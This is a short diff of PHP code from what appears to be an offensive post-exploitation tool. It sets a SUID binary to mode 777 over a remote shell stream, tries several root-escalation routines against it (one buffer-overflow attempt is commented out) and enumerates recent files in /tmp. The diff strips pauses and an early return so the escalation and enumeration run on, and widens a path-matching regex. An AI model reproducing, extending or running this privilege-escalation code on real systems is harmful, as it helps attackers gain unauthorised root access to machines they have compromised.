@@ -84,10 +84,10 @@ Many times, we do want to see if there are any files owned by those users outsid
             $data = "chmod 777 $suid";
             $this->lan2stream4result($data,$this->stream_timeout);
             $this->pause();                       
-            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");$this->pause();
-            if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);$this->pause();
-            if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);$this->pause();           
-            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($suid);$this->pause();           
+            if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($suid,FALSE,"");
+            if (!$this->ip2root8db($this->ip2id))  $this->suids8env($suid);
+            if (!$this->ip2root8db($this->ip2id))  $this->suids8app($suid);           
+            //if (!$this->ip2root8db($this->ip2id)) $this->suids8bof($suid);     
         }
     }
     
@@ -111,8 +111,7 @@ Many times, we do want to see if there are any files owned by those users outsid
             $this->pause();
         }
         
-        
-        return 0;
+    
         
         $data = "find /tmp -type f -maxdepth 5 -mmin -60 -exec ls -al {} \; 2> /dev/null";
         $this->lan2stream4result($data,$this->stream_timeout);
@@ -239,7 +238,7 @@ Many times, we do want to see if there are any files owned by those users outsid
         $lines = $this->lan2stream4result($data,$this->stream_timeout);
 
         
-        exec("echo '".base64_encode($lines)."' | base64 -d | grep -Po \"^(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_]{1,})+)\" | sort -u ",$tmp);
+        exec("echo '".base64_encode($lines)."' | base64 -d | grep -Po \"^(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\" | sort -u ",$tmp);
         if(!empty($tmp)){
             $exec_filepath = $tmp;
             $this->article("Found Path into $suid", $this->tab($exec_filepath));
